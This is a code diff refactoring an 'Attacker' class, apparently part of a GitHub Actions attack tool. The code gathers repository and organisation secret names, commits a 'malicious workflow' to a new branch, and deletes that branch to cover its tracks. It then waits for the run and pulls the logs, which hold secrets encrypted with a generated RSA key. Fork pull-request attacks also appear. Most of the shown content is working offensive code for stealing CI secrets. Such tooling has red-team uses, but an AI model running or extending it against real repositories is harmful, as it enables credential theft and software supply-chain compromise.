@@ -75,10 +75,10 @@ class Attacker:
 
         return True
 
-    def __create_private_key(self):
+    @staticmethod
+    def __create_private_key():
         """Creates a private and public key to safely exfil secrets.
         """
-        # generate private key & write to disk  
         private_key = rsa.generate_private_key(
             public_exponent=65537,
             key_size=4096,
@@ -91,6 +91,133 @@ class Attacker:
         )
 
         return (private_key, pem.decode())
+
+    def __collect_secret_names(self, target_repo):
+        """Method to collect list of secrets prior to exifl.
+
+        Args:
+            target_repo (str): Repository to get secrets from.
+
+        Returns:
+            list: List of secret names accessible to the repository.
+        """
+
+        secrets = []
+        secret_names = []
+        repo_secret_list = self.api.get_secrets(target_repo)
+        org_secret_list = self.api.get_repo_org_secrets(target_repo)
+
+        if repo_secret_list:
+            secrets.extend(repo_secret_list)
+
+        if org_secret_list:
+            secrets.extend(org_secret_list)
+
+        if not secrets:
+            Output.warn(
+                "The repository does not have any accessible secrets!"
+            )
+            return False
+        else:
+            Output.owned(
+                f"The repository has {Output.bright(len(secrets))} "
+                "accessible secret(s)!"
+            )
+
+        secret_names = [secret['name'] for secret in secrets]
+
+        return secret_names
+
+    def __execute_and_wait_workflow(
+            self,
+            target_repo: str,
+            branch: str,
+            yaml_contents: str,
+            commit_message: str,
+            yaml_name: str):
+        """Utility method to wrap shared logic for pushing a workflow for a new
+        branch, waiting for the workflow to execute, and getting the workflow
+        ID of the completed workflow.
+
+        Args:
+            target_repo (str): Repository to target.
+            branch (str): Branch to commit to.
+            yaml_contents (str): Contents of yaml file.
+            commit_message (str): Message for commit.
+            yaml_name (str): Name of workflow yaml file to commit.
+
+        Returns:
+            str: Workflow ID if successful, None otherwise.
+        """
+
+        workflow_id = None
+        branch_created = self.api.create_branch(target_repo, branch)
+
+        if not branch_created:
+            Output.error("Failed to create branch!")
+            return False
+
+        rev_hash = self.api.commit_file(
+            target_repo,
+            branch,
+            f".github/workflows/{yaml_name}.yml",
+            yaml_contents.encode(),
+            self.author_name,
+            self.author_email,
+            message=commit_message
+        )
+
+        if not rev_hash:
+            Output.error("Failed to push the malicious workflow!")
+            return False
+
+        Output.result("Succesfully pushed the malicious workflow!")
+
+        for i in range(self.timeout):
+            ret = self.api.delete_branch(target_repo, branch)
+            if ret:
+                break
+            else:
+                time.sleep(1)
+
+        if ret:
+            Output.result("Malicious branch deleted.")
+        else:
+            Output.error(f"Failed to delete the branch: {branch}.")
+
+        Output.tabbed("Waiting for the workflow to queue...")
+
+        for i in range(self.timeout):
+            workflow_id = self.api.get_recent_workflow(
+                target_repo, rev_hash
+            )
+            if workflow_id == -1:
+                Output.error("Failed to find the created workflow!")
+                return
+            elif workflow_id > 0:
+                break
+            else:
+                time.sleep(1)
+        else:
+            Output.error("Failed to find the created workflow!")
+            return
+
+        Output.tabbed("Waiting for the workflow to execute...")
+
+        for i in range(self.timeout):
+            status = self.api.get_workflow_status(target_repo, workflow_id)
+            if status == -1:
+                Output.error("The workflow failed!")
+                break
+            elif status == 1:
+                Output.result("The malicious workflow executed succesfully!")
+                break
+            else:
+                time.sleep(1)
+        else:
+            Output.error("The workflow is incomplete but hit the timeout!")
+
+        return workflow_id
 
     def fork_pr_attack(self, target_repo: str, target_branch: str,
                        pr_title: str, source_branch: str, payload: str,
@@ -134,7 +261,9 @@ class Attacker:
 
             res = self.api.get_repo_branch(target_repo, target_branch)
             if res == 0:
-                Output.error(f"Target branch, {target_branch}, does not exist!")
+                Output.error(
+                    f"Target branch, {target_branch}, does not exist!"
+                )
                 return False
             elif res == -1:
                 Output.error("Failed to check for target branch!")
@@ -194,7 +323,9 @@ class Attacker:
                 message=commit_message
             )
             if not commit_hash:
-                Output.error("Failed to commit the malicious workflow locally!")
+                Output.error(
+                    "Failed to commit the malicious workflow locally!"
+                )
                 return False
 
             status = cloned_repo.push_repository(source_branch)
@@ -306,75 +437,21 @@ class Attacker:
                     payload, branch
                 )
 
-            branch_created = self.api.create_branch(target_repo, branch)
-
-            if not branch_created:
-                Output.error("Failed to create branch!")
-                return False
-
-            rev_hash = self.api.commit_file(
+            workflow_id = self.__execute_and_wait_workflow(
                 target_repo,
                 branch,
-                f".github/workflows/{yaml_name}.yml",
-                yaml_contents.encode(),
-                message=commit_message
+                yaml_contents,
+                commit_message,
+                yaml_name
             )
-
-            if not rev_hash:
-                Output.error("Failed to push the malicious workflow!")
-                return
-
-            Output.result("Succesfully pushed the malicious workflow!")
-
-            for i in range(self.timeout):
-                ret = self.api.delete_branch(target_repo, branch)
-                if ret:
-                    break
-                else:
-                    time.sleep(1)
-
-            if ret:
-                Output.result("Malicious branch deleted.")
-            else:
-                Output.error(f"Failed to delete the branch: {branch}.")
-
-            Output.tabbed("Waiting for the workflow to queue...")
-
-            for i in range(self.timeout):
-                workflow_id = self.api.get_recent_workflow(
-                    target_repo, rev_hash
-                )
-                if workflow_id == -1:
-                    Output.error("Failed to find the created workflow!")
-                    return
-                elif workflow_id > 0:
-                    break
-                else:
-                    time.sleep(1)
-            else:
-                Output.error("Failed to find the created workflow!")
-                return
-
-            Output.tabbed("Waiting for the workflow to execute...")
-
-            for i in range(self.timeout):
-                status = self.api.get_workflow_status(target_repo, workflow_id)
-                if status == -1:
-                    Output.error("The workflow failed!")
-                    break
-                elif status == 1:
-                    Output.result("The malicious workflow executed succesfully!")
-                    break
-                else:
-                    time.sleep(1)
-            else:
-                Output.error("The workflow is incomplete but hit the timeout!")
 
             res = self.api.download_workflow_logs(target_repo, workflow_id)
             if not res:
                 Output.error("Failed to download logs!")
             else:
-                Output.result(f"Workflow logs downloaded to {workflow_id}.zip!")
+                Output.result(
+                    f"Workflow logs downloaded to {workflow_id}.zip!"
+                )
 
             if delete_action:
                 res = self.api.delete_workflow_run(target_repo, workflow_id)
@@ -394,10 +471,17 @@ class Attacker:
             commit_message: str,
             delete_action: bool,
             yaml_name: str):
-        """Dump accessible pipeline secrets from a repository. 
+        """Given a user with write access to a repository, runs a workflow that
+        dumps all repository secrets.
 
         Args:
-            target_repo (str): Target repository to dump secrets from.
+            target_repo (str): Repository to target.
+            target_branch (str): Branch to create workflow in.
+            commit_message (str): Commit message for exfil workflow.
+            delete_action (bool): Whether to delete the workflow after
+            execution.
+            yaml_name (str): Name of yaml to use for exfil workflow.
+
         """
         self.__setup_user_info()
 
@@ -406,31 +490,18 @@ class Attacker:
 
         if 'repo' in self.user_perms['scopes'] and \
            'workflow' in self.user_perms['scopes']:
-            secrets = []
-            repo_secret_list = self.api.get_secrets(target_repo)
-            org_secret_list = self.api.get_repo_org_secrets(target_repo)
 
-            if repo_secret_list:
-                secrets.extend(repo_secret_list)
+            secret_names = self.__collect_secret_names(target_repo)
 
-            if org_secret_list:
-                secrets.extend(org_secret_list)
-
-            if not secrets:
-                Output.warn(
-                    "The repository does not have any accessible secrets!"
-                )
-            else:
-                Output.owned(
-                    f"The repository has {Output.bright(len(secrets))} "
-                    "accessible secrets!"
-                )
-
-            secret_names = [secret['name'] for secret in secrets]
+            if not secret_names:
+                return False
 
             # Randomly generate a branch name, since this will run immediately
-            branch = ''.join(random.choices(
-                string.ascii_lowercase, k=10))
+            if target_branch:
+                branch = target_branch
+            else:
+                branch = ''.join(random.choices(
+                    string.ascii_lowercase, k=10))
 
             res = self.api.get_repo_branch(target_repo, branch)
             if res == -1:
@@ -440,75 +511,22 @@ class Attacker:
                 Output.error(f"Remote branch, {branch}, already exists!")
                 return
 
-            priv_key, pubkey_pem = self.__create_private_key()
+            priv_key, pubkey_pem = Attacker.__create_private_key()
 
             yaml_contents = CICDAttack.create_exfil_yaml(
                 secret_names, pubkey_pem, branch
             )
 
-            branch_created = self.api.create_branch(target_repo, branch)
-
-            if not branch_created:
-                Output.error("Failed to create branch!")
-                return False
-
-            rev_hash = self.api.commit_file(
+            workflow_id = self.__execute_and_wait_workflow(
                 target_repo,
                 branch,
-                f".github/workflows/{yaml_name}.yml",
-                yaml_contents.encode(),
-                message=commit_message
+                yaml_contents,
+                commit_message,
+                yaml_name
             )
 
-            if not rev_hash:
-                Output.error("Failed to push the malicious workflow!")
+            if not workflow_id:
                 return
-
-            Output.result("Succesfully pushed the malicious workflow!")
-
-            for i in range(self.timeout):
-                ret = self.api.delete_branch(target_repo, branch)
-                if ret:
-                    break
-                else:
-                    time.sleep(1)
-
-            if ret:
-                Output.result("Malicious branch deleted.")
-            else:
-                Output.error(f"Failed to delete the branch: {branch}.")
-
-            Output.tabbed("Waiting for the workflow to queue...")
-
-            for i in range(self.timeout):
-                workflow_id = self.api.get_recent_workflow(
-                    target_repo, rev_hash
-                )
-                if workflow_id == -1:
-                    Output.error("Failed to find the created workflow!")
-                    return
-                elif workflow_id > 0:
-                    break
-                else:
-                    time.sleep(1)
-            else:
-                Output.error("Failed to find the created workflow!")
-                return
-
-            Output.tabbed("Waiting for the workflow to execute...")
-
-            for i in range(self.timeout):
-                status = self.api.get_workflow_status(target_repo, workflow_id)
-                if status == -1:
-                    Output.error("The workflow failed!")
-                    break
-                elif status == 1:
-                    Output.result("The malicious workflow executed succesfully!")
-                    break
-                else:
-                    time.sleep(1)
-            else:
-                Output.error("The workflow is incomplete but hit the timeout!")
 
             res = self.api.retrieve_workflow_log(
                 target_repo, workflow_id, "Run Tests"
@@ -546,8 +564,6 @@ class Attacker:
                     Output.error("Failed to delete workflow!")
                 else:
                     Output.result("Workflow deleted sucesfully!")
-
-            pass
         else:
             Output.error(
                 "The user does not have the necessary scopes to conduct this "
